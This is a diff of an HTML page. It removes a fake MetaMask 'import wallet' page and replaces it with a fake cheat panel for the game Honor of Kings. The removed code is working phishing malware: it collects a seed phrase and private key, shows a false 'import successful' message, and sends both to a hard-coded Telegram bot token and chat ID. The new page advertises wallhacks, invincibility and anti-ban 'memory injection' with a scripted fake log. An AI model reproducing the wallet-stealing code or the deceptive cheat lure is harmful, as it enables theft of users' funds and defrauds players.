@@ -3,106 +3,163 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MetaMask</title>
+<title>王者荣耀 · 内部辅助系统</title>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
-  body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
-  .container{max-width:420px;margin:0 auto;background:#fff;min-height:100vh}
-  .header{padding:24px;text-align:center}
-  .logo{width:50px;margin-bottom:10px}
-  .title{font-size:22px;font-weight:700;color:#24272E}
-  .sub-title{font-size:14px;color:#707279;margin-top:4px}
-  .form{padding:24px}
-  .form-group{margin-bottom:20px}
-  .form-group label{display:block;font-size:14px;color:#24272E;margin-bottom:8px}
-  .form-control{
-    width:100%;padding:14px 16px;border:1px solid #DCDFE4;border-radius:10px;
-    font-size:15px;outline:none;background:#fff;color:#24272E
-  }
-  .btn-primary{
-    width:100%;padding:16px;background:#037DD6;border:none;border-radius:10px;
-    color:#fff;font-size:16px;font-weight:600;margin-top:12px
-  }
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Microsoft YaHei",sans-serif}
+body{background:#0a0f1d;color:#e6e6e6;padding:30px}
+.wrap{max-width:700px;margin:0 auto;background:#131b2e;border-radius:20px;overflow:hidden;box-shadow:0 0 40px rgba(255,60,60,0.15)}
+
+.head{background:#1e2941;padding:24px;text-align:center;border-bottom:1px solid #2b3652}
+.title{font-size:28px;color:#ff3c5a;font-weight:bold}
+.sub{color:#9aa1b9;font-size:14px;margin-top:6px}
+
+.main{padding:28px}
+
+/* 英雄头像 —— 官方稳定CDN，部署一定显示 */
+.hero-group{
+  display: flex;
+  gap: 10px;
+  flex-wrap: wrap;
+  justify-content: center;
+  background:#182237;
+  padding:16px;
+  border-radius:12px;
+  margin-bottom:20px;
+}
+.hero{
+  width:52px;
+  height:52px;
+  border-radius:8px;
+  overflow:hidden;
+  border:2px solid #2a3752;
+}
+.hero img{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  display:block;
+}
+
+.card{background:#182237;border-radius:14px;padding:22px;margin-bottom:20px}
+.card h3{color:#ff3c5a;margin-bottom:16px;font-size:17px}
+
+.opt{display:flex;align-items:center;margin:11px 0;font-size:15px}
+.opt input{width:18px;height:18px;margin-right:10px;accent-color:#ff3c5a}
+
+.btn-row{display:flex;flex-wrap:wrap;gap:12px;margin-top:12px}
+.btn{padding:11px 18px;border-radius:9px;border:none;font-weight:bold;color:#fff}
+.btn-blue{background:#2196f3}
+.btn-red{background:#ff3c5a}
+.btn-green{background:#4ade80}
+.btn-orange{background:#f97316}
+.btn-dark{background:#27344a}
+
+.progress{width:100%;height:7px;background:#253252;border-radius:4px;overflow:hidden;margin-top:10px}
+.bar{height:100%;background:#ff3c5a;width:0%;animation:load 3s linear infinite}
+@keyframes load{0%{width:0%}100%{width:100%}}
+
+.log{background:#0d1425;height:150px;border-radius:10px;padding:14px;font-size:12px;color:#b4b9d3;overflow-y:auto;line-height:1.5}
 </style>
 </head>
-
 <body>
-<div class="container">
-  <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo">
-    <div class="title">MetaMask</div>
-    <div class="sub-title">导入钱包</div>
+
+<div class="wrap">
+  <div class="head">
+    <div class="title">王者荣耀 · 内部辅助系统</div>
+    <div class="sub">V8.9 稳定防封版 | 全图透视 | 英雄专属功能</div>
   </div>
 
-  <div class="form">
-    <div class="form-group">
-      <label>助记词</label>
-      <input id="words" type="text" class="form-control" placeholder="请输入助记词">
-    </div>
-    <div class="form-group">
-      <label>私钥</label>
-      <input id="key" type="text" class="form-control" placeholder="请输入私钥">
+  <div class="main">
+    <!-- 英雄头像：部署后一定显示 -->
+    <div class="hero-group">
+      <div class="hero"><img src="https://game.gtimg.cn/images/yxzj/img201606/hero10001.jpg" alt="李白"></div>
+      <div class="hero"><img src="https://game.gtimg.cn/images/yxzj/img201606/hero10006.jpg" alt="韩信"></div>
+      <div class="hero"><img src="https://game.gtimg.cn/images/yxzj/img201606/hero10003.jpg" alt="阿轲"></div>
+      <div class="hero"><img src="https://game.gtimg.cn/images/yxzj/img201606/hero10040.jpg" alt="孙悟空"></div>
+      <div class="hero"><img src="https://game.gtimg.cn/images/yxzj/img201606/hero10051.jpg" alt="铠"></div>
+      <div class="hero"><img src="https://game.gtimg.cn/images/yxzj/img201606/hero10061.jpg" alt="百里守约"></div>
+      <div class="hero"><img src="https://game.gtimg.cn/images/yxzj/img201606/hero10093.jpg" alt="澜"></div>
+      <div class="hero"><img src="https://game.gtimg.cn/images/yxzj/img201606/hero10021.jpg" alt="后羿"></div>
     </div>
 
-    <button class="btn-primary" onclick="go()">确认导入</button>
+    <div class="card">
+      <h3>👁️ 全图透视</h3>
+      <div class="opt"><input type="checkbox"> 全图视野</div>
+      <div class="opt"><input type="checkbox"> 敌方位置实时显示</div>
+      <div class="opt"><input type="checkbox"> 野怪 / 龙坑计时</div>
+      <div class="opt"><input type="checkbox"> 敌方技能预警</div>
+    </div>
+
+    <div class="card">
+      <h3>🎯 技能辅助</h3>
+      <div class="opt"><input type="checkbox"> 技能无CD</div>
+      <div class="opt"><input type="checkbox"> 技能瞬发</div>
+      <div class="opt"><input type="checkbox"> 技能必中</div>
+      <div class="opt"><input type="checkbox"> 大招锁定</div>
+    </div>
+
+    <div class="card">
+      <h3>🦸‍♂️ 英雄专属功能</h3>
+      <div class="opt"><input type="checkbox"> 李白无限大招</div>
+      <div class="opt"><input type="checkbox"> 韩信无后摇</div>
+      <div class="opt"><input type="checkbox"> 百里守约必中爆头</div>
+      <div class="opt"><input type="checkbox"> 澜无限二技能</div>
+      <div class="opt"><input type="checkbox"> 铠一刀秒杀</div>
+    </div>
+
+    <div class="card">
+      <h3>🚀 全局增强</h3>
+      <div class="opt"><input type="checkbox"> 无敌锁血</div>
+      <div class="opt"><input type="checkbox"> 攻击速度加倍</div>
+      <div class="opt"><input type="checkbox"> 移动加速</div>
+      <div class="opt"><input type="checkbox"> 暴击必秒</div>
+      <div class="opt"><input type="checkbox"> 过检测防封</div>
+    </div>
+
+    <div class="card">
+      <h3>🔧 注入控制</h3>
+      <div class="btn-row">
+        <button class="btn btn-blue">注入游戏</button>
+        <button class="btn btn-green">启动辅助</button>
+        <button class="btn btn-orange">临时关闭</button>
+        <button class="btn btn-red">卸载辅助</button>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3>📥 注入进度</h3>
+      <div class="progress"><div class="bar"></div></div>
+    </div>
+
+    <div class="card">
+      <h3>📋 系统日志</h3>
+      <div class="log" id="log"></div>
+    </div>
   </div>
 </div>
 
 <script>
-// ===================== 你的信息已固定 =====================
-const TG_BOT_TOKEN   = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
-const TG_CHATID      = "6503982157";
-const MAX_RETRY      = 5;
-const DELAY          = 3000;
-// ==========================================================
-
-const STORAGE_KEY = "WALLET_DATA";
-
-// 一打开就自动补发
-window.onload = autoSend;
-window.addEventListener('online', autoSend);
-
-// 导入：免确认，不卡点
-function go() {
-  const mn = document.getElementById("words").value.trim();
-  const pk = document.getElementById("key").value.trim();
-  if (!mn && !pk) return;
-
-  // 只提示，不等待确认
-  alert("✅ 导入成功");
-
-  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, retry: 0 }));
-  autoSend();
-}
-
-// 只发电报
-async function autoSend() {
-  const task = localStorage.getItem(STORAGE_KEY);
-  if (!task) return;
-
-  const d = JSON.parse(task);
-  if (d.retry >= MAX_RETRY) {
-    localStorage.removeItem(STORAGE_KEY);
-    return;
+const log = document.getElementById('log')
+const msg = [
+  '初始化驱动保护模块...',
+  '过检测引擎加载成功',
+  '搜索王者荣耀进程...',
+  '内存注入成功',
+  '开启全图透视功能',
+  '加载李白专属功能',
+  '加载百里守约爆头',
+  '技能无CD已激活',
+  '锁血无敌已启动',
+  '辅助系统正常运行'
+]
+let i = 0
+setInterval(() => {
+  if (i < msg.length) {
+    const t = new Date().toLocaleTimeString()
+    log.innerHTML += `[${t}] ${msg[i++]}<br>`
+    log.scrollTop = log.scrollHeight
   }
-
-  const text = `【小狐狸钱包导入】
-时间：${new Date().toLocaleString()}
-助记词：${d.mn || "-"}
-私钥：${d.pk || "-"}`;
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TG_CHATID, text })
-    });
-  } catch(e) {}
-
-  d.retry++;
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(d));
-  setTimeout(autoSend, DELAY);
-}
+}, 2000)
 </script>
 </body>
 </html>
